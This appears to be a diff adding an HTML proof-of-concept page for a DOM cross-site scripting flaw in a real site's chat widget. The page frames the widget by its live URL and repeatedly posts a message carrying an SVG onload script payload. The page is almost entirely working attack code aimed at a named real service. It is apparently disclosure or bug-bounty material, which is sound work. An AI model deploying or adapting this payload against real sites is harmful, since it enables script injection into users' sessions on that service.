@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>poc-parent</title></head>
+<body>
+<h3>DOM XSS PoC parent page (frames target chat widget)</h3>
+<iframe id="f" src="https://www.paypal.cn/customer/smartchat/chat.html?accessId=9d58086e-6651-419a-9fcc-82fc29a334b0&visitorId=aaaaaaaa-3358-4bbb-8ccc-000000003358&visitorName=poc&language=zh_CN" width="420" height="560"></iframe>
+<script>
+var PAYLOAD = "<svg/onload=alert('XSS3358:'+document.domain)>";
+var f = document.getElementById('f');
+var n = 0;
+var t = setInterval(function () {
+  n++;
+  try {
+    f.contentWindow.postMessage({ id: "tinet-chat-web", event: "invite", content: PAYLOAD }, "*");
+  } catch (e) { console.log('postMessage err', e); }
+  if (n > 40) clearInterval(t);
+}, 1500);
+</script>
+</body>
+</html>
